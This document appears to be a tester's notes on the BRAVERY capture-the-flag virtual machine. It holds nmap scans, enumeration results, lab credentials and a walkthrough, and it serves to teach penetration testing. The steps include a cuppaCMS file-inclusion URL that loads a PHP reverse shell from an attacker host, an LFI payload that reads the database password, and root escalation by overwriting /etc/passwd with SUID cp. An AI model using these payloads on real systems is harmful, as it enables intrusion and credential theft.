OS: CentOS 

Web Technology: 
80: Apache 2.4.6 / PHP 5.4.16 / OpenSSL 1.0.2k-fips / Default Webpage / cuppaCMS
8080: nginx 1.12.2 / Good Tech / San Francisco, Seattle, Singapore, Frankfurt, Dubai, Tokyo, Sydney, London, Sao Paulo
IP:  192.168.1.100

USERS:
Patrick - Head of Development
David Phua - Director: director@goodtech.com.sg
Rick Astley - Head IoT
Qiu - Marketer
Qinyi - Development Intern
Genevieve - Corporate Services
Kenneth Chee - Armitage Corporation

CREDENTIALS:
SMB ///192.168.1.102/secured
username: david
password:qwertyuioplkjhgfdsazxcvbnm

#####################################################
Community Attack Vectors (To-Try List):
443 → wFUZZ → GoBuster → Manual Inspection → .__DATA_STORE → nikto → 
 139 → 
 8080 →  wFUZZ → GoBuster → Manual Inspection → .__DATA_STORE → nikto
80 →  wFUZZ → GoBuster → Manual Inspection → .__DATA_STORE → nikto
111 → 
 3306 → 
 22 → 
 53 → 
 445 → create a username and password list from the discovered files and usernames, file names could be passwords
34981 → 
 2049 → 
 20048 → 

#####################################################
NMAP RESULTS:
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)

53/tcp    open  domain      syn-ack ttl 64 dnsmasq 2.76

80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|   Supported Methods: GET HEAD POST OPTIONS TRACE

111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      32952/tcp6  nlockmgr
|   100021  1,3,4      34981/tcp   nlockmgr
|   100021  1,3,4      38995/udp6  nlockmgr
|   100021  1,3,4      59129/udp   nlockmgr
|   100024  1          47866/tcp6  status
|   100024  1          50115/tcp   status
|   100024  1          53886/udp6  status
|   100024  1          57287/udp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl

139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

443/tcp   open  ssl/http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4.7.1 (workgroup: WORKGROUP)

2049/tcp  open  nfs_acl     syn-ack ttl 64 3 (RPC #100227)

3306/tcp  open  mysql       syn-ack ttl 64 MariaDB (unauthorized)

8080/tcp  open  http        syn-ack ttl 64 nginx 1.12.2
|_http-title: Welcome to Bravery! This is SPARTA!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public

20048/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)

34981/tcp open  nlockmgr    syn-ack ttl 64 1-4 (RPC #100021)

50115/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
MAC Address: 08:00:27:B0:53:B2 (Oracle VirtualBox virtual NIC)
Service Info: Host: BRAVERY

Host script results:
| nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BRAVERY<00>          Flags: <unique><active>
|   BRAVERY<03>          Flags: <unique><active>
|   BRAVERY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55928/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12433/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 39208/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37023/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-05-03T14:22:54
|_  start_date: N/A
|_clock-skew: mean: 1h19m51s, deviation: 2h18m34s, median: -9s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2022-05-03T10:22:54-04:00

#####################################################
Steps Taken():
[+] nmap -p- -sC -sV -Pn -n $IP -oN scan -vvv
[+] the source code comment below the incomplete action="https:/192.168.254.141:3" clue us towards the port numbers starting with ‘3’
[+] the nlockmgr is the lock manager for NFS
[+] the showmount command reveals a mountable directory
[+] upon mounting the directory, there are files located 
→ the file “qwertyuioplkjhgfdsazxcvbnm” contains a clue that it is a password
→ the password is valid with the username David for the smb share “secured”
→ the secured share contains information about hidden directories
[+] smbclient reveals the //192.168.1.100/anonymous file share which is unprotected
[+] Discovered cuppaCMS vulnerability → LFI/RFI
[+] 192.168.1.102/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.1.101:8001/php-reverse-shell.php
→ this produces a reverse shell
[+] Privilege Escalation: the cp command has an SUID set
→ this can be exploited by copying the /etc/passwd file to our local machine, then editing the file
→ after the file has been edited with a new user or username and password hash
→ the file can be downloaded from the victim machine and the cp command is used
→ to copy the new passwd file into /etc/passwd
→ this allows us to login to any user we want as root

#####################################################
Web Services Enumeration:  

[  +  NIKTO   ]

[  +  WFUZZ  ]

FILES:   /   (Web Root)
80:
"phpinfo.php"
"README.txt"

8080: http://192.168.1.100:8080/public/mail.php
 "index.html"
"404.html"    
"robots.txt"    
"poweredby.png" 
"50x.html" 
/public/mail.php
/public/.DS_Store
http://192.168.1.102/genevieve/

http://192.168.1.102/genevieve/cuppaCMS/
"images"
"pages" 
"layout"

DIRECTORIES:  /  (Web Root)
80:
cgi-bin 
uploads
http://192.168.1.100/uploads/files/internal/department/procurement/sara/note.txt
icons 

8080:
"private"
 "about"  
"public"
→ "css" 
→ "js"
→ "img"
→ "fonts"
http://192.168.1.102/genevieve/index.html
"index.html" 
 "robots.txt" 
"licence.txt"

#####################################################
OTHER:  

smbclient:
smb: \> ls
  .					                                   D        0  Fri Sep 28 09:01:35 2018
  ..               					                   D        0  Thu Jun 14 12:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 08:38:27 2018
  qiu's folder         		               D        0  Fri Sep 28 09:27:20 2018
  genevieve's folder             D        0  Fri Sep 28 09:08:31 2018
  david's folder               	       D        0  Tue Dec 25 21:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 08:52:49 2018
  qinyi's folder                	      D        0  Fri Sep 28 08:45:22 2018
  sara's folder                 	      D        0  Fri Sep 28 09:34:23 2018
  readme.txt                    	      N      489  Fri Sep 28 09:54:03 2018


http://192.168.1.102/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php 
<?php 
        class Configuration{
                public $host = "localhost";
                public $db = "bravery";
                public $user = "root";
                public $password = "r00tisawes0me";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "goodtech";
                public $secure_login_redirect = "doorshell.jpg";
        } 
?>

Phone Number:
65 60510224
Source Code Comment:
<form target="_blank" novalidate="true" action="https://192.168.254.141:3" method="get" class="form-inline">
<!-- INTERN! Please link this up properly! -->

find / -perm -u=s -type f 2>/dev/null
/usr/bin/cp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/Xorg
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/ksu
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/flatpak-bwrap
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
/usr/libexec/qemu-bridge-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache


showmount -e 192.168.1.100
Export list for 192.168.1.100:
/var/nfsshare *

Upon mounting the /var/nfsshare directory to our local mount directory, we reveal Davids schedule
David will need to fly to various cities for various conferences. Here is his schedule.

1 January 2019 (Tuesday):
New Year's Day. Spend time with family.

2 January 2019 (Wednesday): 
0900: Depart for airport.
0945: Check in at Changi Airport, Terminal 3.
1355 - 2030 hrs (FRA time): Board flight (SQ326) and land in Frankfurt.
2230: Check into hotel.

3 January 2019 (Thursday):
0800: Leave hotel.
0900 - 1700: Attend the Banking and Enterprise Conference.
1730 - 2130: Private reception with the Chancellor.
2230: Retire in hotel.

4 January 2019 (Friday):
0800: Check out from hotel.
0900: Check in at Frankfurt Main.
1305 - 1355: Board flight (LH1190) and land in Zurich.
1600 - 1900: Dinner reception
2000: Check into hotel.

5 January 2019 (Saturday):
0800: Leave hotel.
0930 - 1230: Visit University of Zurich.
1300 - 1400: Working lunch with Mr. Pandelson
1430 - 1730: Dialogue with students at the University of Zurich.
1800 - 2100: Working dinner with Mr. Robert James Miller and wife.
2200: Check into hotel.

6 January 2019 (Sunday):
0730: Leave hotel.
0800 - 1100: Give a lecture on Software Security and Design at the University of Zurich.
1130: Check in at Zurich.
1715 - 2025: Board flight (LX18) and land in Newark.
2230: Check into hotel.

7 January 2019 (Monday):
0800: Leave hotel.
0900 - 1200: Visit Goldman Sachs HQ
1230 - 1330: Working lunch with Bill de Blasio
1400 - 1700: Visit McKinsey HQ
1730 - 1830: Visit World Trade Center Memorial
2030: Return to hotel.

8 January 2019 (Tuesday):
0630: Check out from hotel.
0730: Check in at Newark.
0945 - 1715 (+1): Board flight (SQ21)

9 January 2019 (Wednesday):
1715: Land in Singapore.
1815 - 2015: Dinner with wife.
2100: Clear local emails and head to bed.


#####################################################
Take Away Concepts:
• showmount command is useful for finding publicly mountable directories which may contain valuable information
• explore vulnerabilties for the CMS
• the copy command can be used for privilege escalation
• sometimes trying harder isn't enough and you simply just don't know what you need to figure out
   ◇ this is when you go ahead and seek out a walkthrough for some hints
   ◇ once you have a new direction from the hints, try to take that and finish the box without anymore hints
